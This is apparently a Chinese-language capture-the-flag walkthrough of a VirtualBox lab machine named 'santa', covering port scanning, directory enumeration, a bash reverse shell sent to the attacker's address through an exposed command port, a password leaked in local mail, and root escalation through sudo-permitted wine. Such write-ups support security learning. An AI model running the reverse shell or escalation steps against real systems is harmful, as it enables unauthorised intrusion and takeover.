# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 23:55 EDT

Nmap scan report for santa (192.168.2.2)
Host is up (0.00017s latency).
MAC Address: 08:00:27:99:CD:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 7.20 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 23:56 EDT
Nmap scan report for santa (192.168.2.2)
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
MAC Address: 08:00:27:99:CD:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
```

# 漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.2.2 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                     
 (_||| _) (/_(_|| (_| )                                              
                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET
Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.2.2/_26-04-14_23-58-55.txt

Target: http://192.168.2.2/

[23:58:55] Starting:                                                 
[23:58:56] 403 -  199B  - /.htaccess.orig
[23:58:56] 403 -  199B  - /.htaccess.bak1
[23:58:56] 403 -  199B  - /.htaccess.save
[23:58:56] 403 -  199B  - /.htaccess_extra
[23:58:56] 403 -  199B  - /.htaccess_sc
[23:58:56] 403 -  199B  - /.ht_wsr.txt
[23:58:56] 403 -  199B  - /.htaccess.sample
[23:58:56] 403 -  199B  - /.htaccess_orig
[23:58:56] 403 -  199B  - /.htaccessOLD2
[23:58:56] 403 -  199B  - /.htaccessOLD
[23:58:56] 403 -  199B  - /.htaccessBAK
[23:58:56] 403 -  199B  - /.htm
[23:58:56] 403 -  199B  - /.html
[23:58:56] 403 -  199B  - /.htpasswds
[23:58:56] 403 -  199B  - /.htpasswd_test
[23:58:56] 403 -  199B  - /.httr-oauth
[23:59:01] 301 -  242B  - /administration  ->  http://192.168.2.2/administration/
[23:59:01] 301 -  237B  - /administration/  ->  http://192.168.2.2/media.html
[23:59:01] 301 -  237B  - /administration/Sym.php  ->  http://192.168.2.2/media.html
[23:59:08] 301 -  238B  - /javascript  ->  http://192.168.2.2/javascript/
[23:59:15] 200 -   69B  - /robots.txt
[23:59:15] 403 -  199B  - /server-status
[23:59:15] 403 -  199B  - /server-status/

Task Completed
```

看一下robots.txt

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.2/robots.txt
User-agent: *
Disallow: /
Disallow: /administration/
Disallow: /santa
```

/administration是一个视频，/santa是一个登陆页面

<img width="453" height="405" alt="图片" src="https://github.com/user-attachments/assets/38d1e9bf-c6b3-456f-979c-36148eae028b" />

尝试sql注入，没有成功。
页面突然404了？？？，重启一下看看吧

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24                     
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 00:05 EDT

Nmap scan report for santa (192.168.2.2)
Host is up (0.00034s latency).
MAC Address: 08:00:27:99:CD:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 3.15 seconds
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-15 00:06 EDT
Nmap scan report for santa (192.168.2.2)
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd
63611/tcp open  unknown
MAC Address: 08:00:27:99:CD:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

多了一个63611端口，看一下

```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.2.2 63611    
ls
user.txt
cat cuser.txt
```

可以执行命令，但是没有回显，反弹一个shell

```
bash -c 'bash -i >& /dev/tcp/192.168.2.15/1234 0>&1'
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.2.15] from (UNKNOWN) [192.168.2.2] 38136
bash: cannot set terminal process group (918): Inappropriate ioctl for device
bash: no job control in this shell
alabaster@santa:~$ id
id
uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
```

# 权限提升

```
//发现存在邮件
╔══════════╣ Searching installed mail applications
sendmail                                                              
sendmail-msp
sendmail-mta

╔══════════╣ Mails (limit 50)
    15893      4 -rw-rw----   1 alabaster mail         1156 Apr 15 04:04 /var/mail/alabaster
    35024      4 -rw-------   1 root      mail          730 Apr 15 04:13 /var/mail/root
    15893      4 -rw-rw----   1 alabaster mail         1156 Apr 15 04:04 /var/spool/mail/alabaster
    35024      4 -rw-------   1 root      mail          730 Apr 15 04:13 /var/spool/mail/root
alabaster@santa:~$ cat /var/mail/alabaster
cat /var/mail/alabaster
From santa@santa.hmv  Wed Apr 15 04:04:01 2026
Return-Path: <santa@santa.hmv>
Received: from santa.hmv (localhost [127.0.0.1])
        by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 63F441Yr001690
        for <alabaster@santa.hmv>; Wed, 15 Apr 2026 04:04:01 GMT
Received: (from santa@localhost)
        by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 63F441Rr001689;
        Wed, 15 Apr 2026 04:04:01 GMT
From: Santa Claus <santa@santa.hmv>
Message-Id: <202604150404.63F441Rr001689@santa.hmv>
Subject: Important update about the hack
To: <alabaster@santa.hmv>
User-Agent: mail (GNU Mailutils 3.15)
Date: Wed, 15 Apr 2026 04:04:01 +0000

Dear Alabaster, 

As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible. 

I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates. 

His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next. 

Please help Bill as much as possible so Christmas can go on! 

- Santa

┌──(kali㉿kali)-[~]
└─$ ssh bill@192.168.2.2                                        
The authenticity of host '192.168.2.2 (192.168.2.2)' can't be established.
ED25519 key fingerprint is SHA256:J/3611owRnj8DM94b4MrwaA608xl6Yad0OkFKxVmBe4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.2' (ED25519) to the list of known hosts.
bill@192.168.2.2's password: 
Welcome to Ubuntu 23.04 (GNU/Linux 6.2.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 15 04:29:40 AM UTC 2026

  System load:  0.19              Processes:               190
  Usage of /:   70.3% of 9.75GB   Users logged in:         1
  Memory usage: 27%               IPv4 address for enp0s3: 192.168.2.2
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

51 updates can be applied immediately.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ id
uid=1007(bill) gid=1007(bill) groups=1007(bill)
//wine：可以执行任意程序的运行环境
$ sudo -l
Matching Defaults entries for bill on santa:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User bill may run the following commands on santa:
    (ALL) NOPASSWD: /usr/bin/wine
//wine进程=root权限,wine启动Windows shell,Windows shell可以调用Linux路径
$ sudo /usr/bin/wine cmd
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
Microsoft Windows 6.1.7601

Z:\home\bill>whoami
013c:err:winediag:ntlm_check_version ntlm_auth was not found. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
013c:err:ntlm:ntlm_LsaApInitializePackage no NTLM support, expect problems
SANTA\root
Z:\home\bill>cd /root
Z:\root>type root.txt
```
